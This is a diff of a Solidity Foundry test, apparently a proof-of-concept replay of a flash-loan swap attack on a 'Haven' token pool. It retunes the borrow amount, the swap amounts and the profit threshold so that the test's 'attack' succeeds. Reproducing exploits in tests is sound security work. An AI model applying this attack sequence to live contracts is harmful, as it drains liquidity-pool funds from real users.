@@ -267,7 +267,7 @@ contract HavenTestBase is Test, BlockLoader {
     }
 
     function attackGoal() public view returns (bool) {
-        return wbnb.balanceOf(attacker) >= 1e18 + balanceOfwbnbattacker;
+        return wbnb.balanceOf(attacker) >= 1e6 + balanceOfwbnbattacker;
     }
 
     function borrow_wbnb_owner(uint256 amount) internal eurus {
@@ -360,26 +360,17 @@ contract HavenTestBase is Test, BlockLoader {
 
     function test_gt() public {
         vm.startPrank(attacker);
-        borrow_wbnb_owner(0xde0b6b3a7640000);
+        borrow_wbnb_owner(0x6f05b59d3b20000);
         printBalance("After step0 ");
         swap_pairhw_haven_haven_wbnb(1, 1);
         printBalance("After step1 ");
-        swap_pairhw_attacker_wbnb_haven(
-            0xde0b6b3a764000,
-            0x107ad8f556c
-        );
+        swap_pairhw_attacker_wbnb_haven(0xde0b6b3a764000, 0x10d9e630e3b);
         printBalance("After step2 ");
-        swap_pairbh_attacker_haven_busd(
-            0xde0b6b3a76,
-            0xf9ccd8a1c5080000
-        );
+        swap_pairbh_attacker_haven_busd(0xea7bb7545d, 0xe54f93491895b800);
         printBalance("After step3 ");
-        swap_pairbw_attacker_busd_wbnb(
-            0xebec21ee1da40000,
-            0xebec21ee1da400
-        );
+        swap_pairbw_attacker_busd_wbnb(0xe54f93491895b800, 0xe4fbc69449f200);
         printBalance("After step4 ");
-        payback_wbnb_owner(0xdecdb5384967780);
+        payback_wbnb_owner((0x6f05b59d3b20000 * 1003) / 1000);
         printBalance("After step5 ");
         require(attackGoal(), "Attack failed!");
         vm.stopPrank();
